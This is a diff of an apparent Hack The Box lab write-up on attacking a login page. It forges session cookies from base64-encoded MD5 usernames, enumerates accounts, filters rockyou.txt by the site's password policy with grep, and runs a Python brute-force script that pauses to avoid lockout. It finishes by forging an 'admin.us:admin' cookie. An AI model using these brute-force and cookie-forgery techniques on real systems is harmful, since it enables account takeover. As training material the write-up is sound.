@@ -947,11 +947,15 @@ our target has a login page with multiple potential access points such as rememb
 
 there also appears to be a base64 encoded `htb_sessid` cookie in use: 
 
-![](Images/Pasted%20image%2020240222112509.png)
+![](Images/Pasted%20image%2020240222165730.png)
 
-![](Images/Pasted%20image%2020240222113145.png)
+decoding this from base64 we can actually see that the result looks like a hash, and trying an md5 hash on test gives you the same cookie generated: 
 
-at least while logged in the sessionid doesn't seem to give any useful results so for now I can try to register an account and see what types of password policy rules will work 
+![](Images/Pasted%20image%2020240222165700.png)
+
+now that I know that I might be able to use found account names to use their session, I can move on to creating accounts and enumerating usernames
+
+first I want to see what kinds of password policies are in place
 
 I start by incrementally modifying passwords: 
 - `test` - invalid "must start with a capital letter"
@@ -1081,7 +1085,23 @@ so far the accounts found were:
 - support
 - guest
 
-so now I can try to brute force the support account by modifying the rockyou list with our found password policy restrictions 
+encoding the username "support" and using the new session value results in:
+
+![](Images/Pasted%20image%2020240222170331.png)
+
+the guest account is the default "account" so no results are found with this as the cookie
+
+looking around the site to find more info you can see in the support section: 
+
+![](Images/Pasted%20image%2020240222171521.png)
+
+there might be more than just the support account so now I want to find more by adding on country codes to the end of the usernames like `user1` or `user.us` 
+
+for now I do this manually and can immediately find `admin.us` along with other variations like `admin.uk` and the same with `support.us`: 
+
+![](Images/Pasted%20image%2020240222171926.png)
+
+so now I can try to brute force the found accounts by modifying the rockyou list with our found password policy restrictions 
 
 to filter the list we need to consider the following password criteria: 
 - start with capital letter
@@ -1090,12 +1110,23 @@ to filter the list we need to consider the following password criteria:
 - contain one of these special characters: `$ # @`
 - be between 20 and 29 character length 
 
+with this in mind I can do a basic filter with grep: 
 
+`grep '^.\{20,29\}$' /usr/share/wordlists/rockyou.txt | grep '^[A-Z]' | grep '[[:lower:]]' | grep '[0-9]$' | grep '[$#@]'`
+
+![](Images/Pasted%20image%2020240222152543.png)
+
+then I test to find that after 6 failed logins you need to wait 30 seconds before trying again
+
+![](Images/Pasted%20image%2020240222152448.png)
+
+now I modify a new script to take in a list of usernames and passwords to brute force the logins:
 
 ```python
 import sys
 import requests
 import os.path
+import time
 
 # define target url, change as needed
 url = "http://94.237.48.205:33074/login.php"
@@ -1123,7 +1154,6 @@ def do_req(url, user, message, headers):
 if defined valid string is found in response body return True
 """
 def check(haystack, needle):
-    print(haystack)
     if needle in haystack:
         return True
     else:
@@ -1145,34 +1175,61 @@ def main():
         for username in ulist:
             usernames.append(username.rstrip())
     
+    passwords = []  
+    
+    with open(password_list) as plist:
+        for password in plist:
+            passwords.append(password.rstrip())
+    
     successful_credentials = {}
 
-    with open(password_list) as fh:
-        # will be slow for long lists of usernames but for now we have only a few
-        for username in usernames:
-            for fline in fh:
-                # skip line if it starts with a comment
-                if fline.startswith("#"):
-                    continue
-                
-                password = fline.rstrip()
-                res = do_req(url, username, password, headers)
+    # will be slow for long lists of usernames but for now we have only a few
+    for username in usernames:
+        count = 0
+    
+        for password in passwords:
+            if count >= 6:
+                time.sleep(30)
+                count = 0
+         
+            res = do_req(url, username, password, headers)
 
-                # call function check() to verify if HTTP response text matches our content
-                if (check(res, valid)):
-                    print(f"{username}:{password} - successfully logged in")
-                    successful_credentials[username] = password
-                else:
-                    print(f"{username}:{password}")
-                
-        print("Successful credentials found: \n")
-        
-        for username, password in successful_credentials.items():
-            print(f"{username}:{password}")
+            # call function check() to verify if HTTP response text matches our content
+            if (check(res, valid)):
+                print(f"{username}:{password} - successfully logged in")
+                successful_credentials[username] = password
+            else:
+                print(f"{username}:{password}")
+            
+            count += 1 
+            
+    print("Successful credentials found: \n")
+    
+    for username, password in successful_credentials.items():
+        print(f"{username}:{password}")
 
 if __name__ == "__main__":
     main()
 ```
 
+I get one result with `support.us`: 
 
+![](Images/Pasted%20image%2020240222174744.png)
 
+![](Images/Pasted%20image%2020240222174828.png)
+
+when logged in you can see a very different session id that doesn't look like just the base64 encoded username, and when decoding it you can see: 
+
+![](Images/Pasted%20image%2020240222175234.png)
+
+the first part before the colon is the username: 
+
+![](Images/Pasted%20image%2020240222175339.png)
+
+from previous decodings, and from guessing that the colon might signify the user role, you can see that the next part after the colon is just "support": 
+
+![](Images/Pasted%20image%2020240222175547.png)
+
+from here we can try to modify this to be "admin" instead but just using this with the `support.us` account will not work because it can't have the admin role 
+
+instead you can encode `admin.us:admin` and use this as the session cookie to get the flag
